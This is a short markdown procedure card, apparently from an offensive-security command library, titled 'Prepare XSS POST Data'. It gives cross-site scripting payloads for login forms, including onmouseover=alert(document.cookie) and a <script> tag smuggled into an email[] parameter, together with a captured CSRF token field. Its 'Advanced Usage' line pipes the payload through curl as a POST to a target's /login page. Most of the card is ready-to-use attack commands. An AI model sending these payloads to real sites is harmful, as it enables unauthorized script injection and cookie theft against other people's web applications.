---
id: cmd-prepare-xss-post
data: >-
  # Manual preparation: email[]=<a onmouseover=alert(document.cookie)>xxs
  link</a> &password=g00dPa%24%24w0rD
  &_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5
tags:
  - xss
  - prep
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:35.261Z'
verified: false
validated: true
submitted: true
---
# Prepare XSS POST Data

## Command

```bash
# echo "email[]=<a onmouseover=alert(document.cookie)>xxs link</a> &password=g00dPa%24%24w0rD &_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5" > payload.txt
```

## Description

Prepares the POST data string for XSS injection by echoing or manually crafting the payload parameters for use in curl or form submissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `email[]` | XSS payload string | Yes |
| `password` | Encoded dummy password | Yes |
| `_csrf` | Captured token | Yes |

## Examples

### Basic Usage

```bash
echo "email[]=<a onmouseover=alert(1)>test</a>&password=test&_csrf=token" > payload.txt
```

### Advanced Usage

```bash
echo "email[]=<script>alert('prep')</script>&password=pass&_csrf=token" | curl -X POST -d @- https://target/login -H "Content-Type: application/x-www-form-urlencoded"
```

## Expected Output

A text file or string containing the formatted POST data ready for submission.

## Related

- [[Related Procedure: Access Login Page and Prepare Malicious POST]]
